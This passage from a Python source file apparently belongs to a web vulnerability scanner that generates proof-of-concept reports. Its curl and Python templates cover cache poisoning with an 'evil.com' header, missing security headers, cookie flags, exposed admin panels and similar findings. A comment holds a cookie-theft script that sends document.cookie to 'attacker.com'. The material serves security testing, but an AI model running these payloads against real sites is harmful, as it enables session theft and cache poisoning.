  -d '{self._escape_curl(param)}=injected'
"""

    def _poc_cache_poisoning(self, url: str, param: str, payload: str,
                              evidence: str, method: str) -> str:
        return f"""# Web Cache Poisoning Proof of Concept
# Target: {url}

# Step 1: Poison the cache with injected header
curl -v -H "X-Forwarded-Host: evil.com" \\
  -H "X-Original-URL: /admin" \\
  '{self._escape_curl(url)}'

# Step 2: Verify poison by requesting without header
curl -v '{self._escape_curl(url)}'

# Check if response includes evil.com references (cache poisoned)
"""

    # ─── Inspection-type PoCs ───────────────────────────────────────────

    def _poc_security_headers(self, url: str, param: str, payload: str,
                               evidence: str, method: str) -> str:
        return f"""# Missing Security Headers Proof of Concept
# Target: {url}
# Evidence: {evidence[:200]}

# Check all security headers:
curl -sI '{self._escape_curl(url)}' | grep -iE '^(x-frame|x-content|strict-transport|content-security|x-xss|referrer-policy|permissions-policy)'

# What's missing is exploitable:
# - No X-Frame-Options → Clickjacking possible
# - No CSP → XSS impact amplified
# - No HSTS → MITM downgrade attacks
# - No X-Content-Type-Options → MIME sniffing attacks
"""

    def _poc_missing_hsts(self, url: str, param: str, payload: str,
                          evidence: str, method: str) -> str:
        return self._poc_security_headers(url, param, payload, evidence, method)

    def _poc_missing_xcto(self, url: str, param: str, payload: str,
                          evidence: str, method: str) -> str:
        return self._poc_security_headers(url, param, payload, evidence, method)

    def _poc_missing_csp(self, url: str, param: str, payload: str,
                         evidence: str, method: str) -> str:
        return self._poc_security_headers(url, param, payload, evidence, method)

    def _poc_insecure_cookie_flags(self, url: str, param: str, payload: str,
                                    evidence: str, method: str) -> str:
        return f"""# Insecure Cookie Flags Proof of Concept
# Target: {url}

# Check cookie attributes:
curl -sI '{self._escape_curl(url)}' | grep -i 'set-cookie'

# Missing flags to look for:
# - Secure: Cookie sent over HTTP (interceptable via MITM)
# - HttpOnly: Cookie accessible via JavaScript (document.cookie)
# - SameSite: Cookie sent on cross-site requests (CSRF)

# JavaScript cookie theft (if HttpOnly missing):
# <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
"""

    def _poc_information_disclosure(self, url: str, param: str, payload: str,
                                     evidence: str, method: str) -> str:
        return f"""# Information Disclosure Proof of Concept
# Target: {url}
# Evidence: {evidence[:200]}

curl -sI '{self._escape_curl(url)}' | head -20
curl -s '{self._escape_curl(url)}' | head -50
"""

    def _poc_version_disclosure(self, url: str, param: str, payload: str,
                                 evidence: str, method: str) -> str:
        return self._poc_information_disclosure(url, param, payload, evidence, method)

    def _poc_directory_listing(self, url: str, param: str, payload: str,
                                evidence: str, method: str) -> str:
        return f"""# Directory Listing Proof of Concept
# Target: {url}
# Evidence: {evidence[:200]}

curl -s '{self._escape_curl(url)}' | grep -i 'index of\\|directory listing\\|parent directory'
"""

    def _poc_debug_mode(self, url: str, param: str, payload: str,
                        evidence: str, method: str) -> str:
        return f"""# Debug Mode Exposure Proof of Concept
# Target: {url}

curl -s '{self._escape_curl(url)}' | head -100
# Look for: stack traces, framework details, database info, config values
"""

    def _poc_exposed_admin_panel(self, url: str, param: str, payload: str,
                                  evidence: str, method: str) -> str:
        return f"""# Exposed Admin Panel Proof of Concept
# Target: {url}

curl -sI '{self._escape_curl(url)}'
curl -s '{self._escape_curl(url)}' | head -30
# The admin panel is publicly accessible without authentication
"""

    def _poc_exposed_api_docs(self, url: str, param: str, payload: str,
                               evidence: str, method: str) -> str:
        return f"""# Exposed API Documentation Proof of Concept
# Target: {url}

curl -s '{self._escape_curl(url)}' | python3 -m json.tool 2>/dev/null || curl -s '{self._escape_curl(url)}' | head -50
# API documentation/Swagger/GraphQL is publicly accessible
"""

    # ─── Generic fallback ───────────────────────────────────────────────

    def _poc_generic(self, url: str, param: str, payload: str,
                     evidence: str, method: str) -> str:
        """Generic PoC for any vulnerability type not specifically handled."""
        if method.upper() == "GET":
            curl_cmd = f"curl -v '{self._escape_curl(url)}?{self._escape_curl(param)}={self._escape_curl(payload)}'"
        else:
            curl_cmd = f"curl -v -X POST '{self._escape_curl(url)}' -d '{self._escape_curl(param)}={self._escape_curl(payload)}'"

        return f"""#!/usr/bin/env python3
\"\"\"Vulnerability Proof of Concept
Target: {url}
Parameter: {param}
Payload: {payload}
Evidence: {evidence[:200]}
\"\"\"
import requests
import urllib3
urllib3.disable_warnings()

url = "{self._escape_py(url)}"
param = "{self._escape_py(param)}"
payload = "{self._escape_py(payload)}"

{'params' if method.upper() == 'GET' else 'data'} = {{param: payload}}
resp = requests.{method.lower()}(url, {'params=params' if method.upper() == 'GET' else 'data=data'}, verify=False, timeout=15)

print(f"Status: {{resp.status_code}}")
print(f"Length: {{len(resp.text)}}")
print(f"Headers: {{dict(list(resp.headers.items())[:10])}}")
if payload in resp.text:
    print(f"[!] Payload reflected in response!")
print(f"\\nResponse (first 500 chars):\\n{{resp.text[:500]}}")

# curl equivalent:
# {curl_cmd}
"""

    # ─── Escaping helpers ───────────────────────────────────────────────

    @staticmethod
    def _escape_html(s: str) -> str:
        """Escape string for safe HTML embedding."""
        if not s:
            return ""
        return (s.replace("&", "&amp;")
                 .replace("<", "&lt;")
                 .replace(">", "&gt;")
                 .replace('"', "&quot;")
                 .replace("'", "&#x27;"))

    @staticmethod
    def _escape_curl(s: str) -> str:
        """Escape string for curl command embedding."""
        if not s:
            return ""
        return s.replace("'", "'\\''")

    @staticmethod
    def _escape_py(s: str) -> str:
        """Escape string for Python string literal embedding."""
        if not s:
            return ""
        return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
